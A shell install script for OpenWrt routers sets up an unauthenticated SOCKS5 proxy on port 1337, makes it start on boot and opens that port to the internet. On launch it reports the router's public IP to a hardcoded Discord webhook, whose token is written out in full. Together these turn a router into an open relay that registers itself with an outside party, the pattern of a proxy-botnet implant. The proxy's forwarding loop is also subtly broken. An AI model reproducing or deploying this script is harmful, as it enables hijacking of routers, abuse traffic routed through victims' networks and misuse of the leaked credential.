#!/bin/sh
# Install script for SOCKS5 Proxy for OpenWrt
echo "[+] Installing SOCKS5 Proxy for OpenWrt..."

# Install dependencies
opkg update
opkg install python3 python3-pip curl screen
pip3 install requests

# Create proper SOCKS5 proxy script
cat > /root/socks5_proxy.py << 'END_PYTHON'
import socket
import threading
import struct
import time
import urllib.request
import urllib.error
import json

class RealSOCKS5Proxy:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.running = True
        
    def get_public_ip(self):
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=10) as response:
                return response.read().decode('utf-8')
        except:
            return "Unknown"
    
    def send_discord_notification(self, public_ip):
        try:
            webhook_url = "https://discord.com/api/webhooks/1403000617143762985/89m4zh4QzJkk98ouY-2yUPr1L_TiN4WezeBOQ_zqTuHvDPx-RRFQRBzKiV0UpPsNIOzr"
            data = {
                'content': f'✅ **REAL SOCKS5 Proxy ONLINE**\n**IP:** `{public_ip}`\n**Port:** `1337`\n**Protocol:** SOCKS5\n**Status:** 🟢 Working',
                'username': 'Socks5-Proxyman'
            }
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(webhook_url, data=json_data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=15)
            print("[+] Discord notification sent successfully")
        except Exception as e:
            print(f"[-] Discord notification failed: {e}")

    def handle_client(self, client_socket, client_addr):
        try:
            print(f"[+] New connection from {client_addr[0]}:{client_addr[1]}")
            
            # SOCKS5 handshake
            version = client_socket.recv(1)
            if version != b'\x05':
                client_socket.close()
                return
            nmethods = client_socket.recv(1)[0]
            methods = client_socket.recv(nmethods)
            
            # Send method selection: No authentication
            client_socket.send(b'\x05\x00')
            
            # Read request
            request = client_socket.recv(4)
            if len(request) < 4:
                client_socket.close()
                return
                
            version, cmd, rsv, atype = request
            
            if cmd != 1:
                client_socket.send(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            if atype == 1:
                dest_addr = socket.inet_ntoa(client_socket.recv(4))
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            elif atype == 3:
                domain_length = client_socket.recv(1)[0]
                dest_addr = client_socket.recv(domain_length).decode()
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            else:
                client_socket.send(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            print(f"[+] Connecting to {dest_addr}:{dest_port}")
            
            try:
                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_socket.settimeout(30)
                remote_socket.connect((dest_addr, dest_port))
                
                local_addr, local_port = remote_socket.getsockname()
                
                response = b'\x05\x00\x00\x01' + socket.inet_aton(local_addr) + struct.pack('>H', local_port)
                client_socket.send(response)
                
                self.forward_data(client_socket, remote_socket)
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                client_socket.send(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            client_socket.close()
            
    def forward_data(self, client, remote):
        while self.running:
            try:
                data = client.recv(4096)
                if not data:
                    break
                remote.sendall(data)
                
                response = remote.recv(4096)
                if not response:
                    break
                client.sendall(response)
                
            except:
                break
        
        remote.close()
        
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(50)
        
        print(f'[+] Real SOCKS5 proxy started on {self.host}:{self.port}')
        
        # Get public IP and send notification
        public_ip = self.get_public_ip()
        self.send_discord_notification(public_ip)
        
        while self.running:
            try:
                client_socket, client_addr = sock.accept()
                thread = threading.Thread(target=self.handle_client, args=(client_socket, client_addr))
                thread.daemon = True
                thread.start()
            except Exception as e:
                print(f"[-] Accept error: {e}")
                break

if __name__ == "__main__":
    proxy = RealSOCKS5Proxy()
    proxy.start()
END_PYTHON

# Fix permissions
chmod +x /root/socks5_proxy.py

# Create init script for OpenWrt with screen
cat > /etc/init.d/socks5-proxy << 'END_INIT'
#!/bin/sh /etc/rc.common

START=95
STOP=10

start_service() {
    echo "[+] Starting SOCKS5 proxy in screen session..."
    screen -dmS socks5-proxy python3 /root/socks5_proxy.py
    sleep 2
    echo "[+] Screen session started: socks5-proxy"
    echo "[+] To attach to session: screen -r socks5-proxy"
    echo "[+] To detach: Ctrl+A then D"
}

stop_service() {
    echo "[+] Stopping SOCKS5 proxy..."
    screen -S socks5-proxy -X quit 2>/dev/null
    pkill -f "python3 /root/socks5_proxy.py"
    sleep 2
    echo "[+] SOCKS5 proxy stopped"
}

restart_service() {
    stop_service
    sleep 2
    start_service
}

status_service() {
    if screen -list | grep -q "socks5-proxy"; then
        echo "[+] SOCKS5 proxy is running in screen session"
        echo "[+] Screen sessions:"
        screen -list
    else
        echo "[-] SOCKS5 proxy is not running"
    fi
}
END_INIT

# Make init script executable
chmod +x /etc/init.d/socks5-proxy

# Enable and start service
/etc/init.d/socks5-proxy enable
/etc/init.d/socks5-proxy start

# Check status
echo "[+] Installation complete!"
echo "[+] Checking status..."
/etc/init.d/socks5-proxy status

# Open firewall port
echo "[+] Opening firewall port 1337..."
uci add firewall rule
uci set firewall.@rule[-1].name='Allow-SOCKS5-Proxy'
uci set firewall.@rule[-1].target='ACCEPT'
uci set firewall.@rule[-1].src='wan'
uci set firewall.@rule[-1].dest_port='1337'
uci set firewall.@rule[-1].proto='tcp'
uci commit firewall
/etc/init.d/firewall restart

# Create useful management scripts
cat > /usr/bin/socks5-attach << 'END_SCRIPT'
#!/bin/sh
screen -r socks5-proxy
END_SCRIPT

cat > /usr/bin/socks5-status << 'END_SCRIPT'
#!/bin/sh
/etc/init.d/socks5-proxy status
END_SCRIPT

chmod +x /usr/bin/socks5-attach
chmod +x /usr/bin/socks5-status

echo "[+] Proxy should be working now!"
echo "[+] Management commands:"
echo "[+]   socks5-attach    - Attach to proxy screen session"
echo "[+]   socks5-status    - Check proxy status"
echo "[+]   /etc/init.d/socks5-proxy restart - Restart proxy"
echo "[+] Test with: curl --socks5 127.0.0.1:1337 http://ifconfig.me"
echo "[+] External test: curl --socks5 $(uci get network.wan.ipaddr 2>/dev/null || echo "YOUR_EXTERNAL_IP"):1337 http://ifconfig.me"
